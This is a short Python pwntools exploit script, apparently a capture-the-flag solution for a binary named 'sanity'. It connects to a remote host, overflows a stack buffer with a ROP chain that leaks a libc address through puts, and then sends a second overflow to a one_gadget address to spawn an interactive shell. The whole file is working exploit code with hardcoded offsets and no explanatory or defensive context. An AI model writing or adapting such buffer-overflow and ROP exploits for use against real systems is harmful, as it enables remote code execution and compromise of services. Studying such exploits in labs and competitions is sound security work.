#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

r = remote("35.185.151.73", 8044)
#r = process("./sanity", env = {"LD_PRELOAD" : "./libc-2.23.so"})
#gdb.attach(proc.pidof(r)[0])

puts_plt = 0x4004b0
gets_plt = 0x4004d0
fflush_plt = 0x4004e0
puts_got = 0x601018
pop_rdi = 0x4006a3
pop_rbp = 0x400560
leave = 0x400634
main_somewhere = 0x40060F
buf = 0x601100

payload = b'A' * 120
payload += flat([pop_rdi, puts_got, puts_plt, pop_rbp, buf - 0x8, main_somewhere])

print(r.recvline())
r.sendline(payload)

libc = int.from_bytes(r.recvline().strip().ljust(8, b'\x00')[:8], 'little') - 0x6f690
print("libc base :", hex(libc))

one_gadget = 0x4526a
payload = b'A' * 120
payload += flat([libc + one_gadget])

r.sendline(payload)

r.interactive()
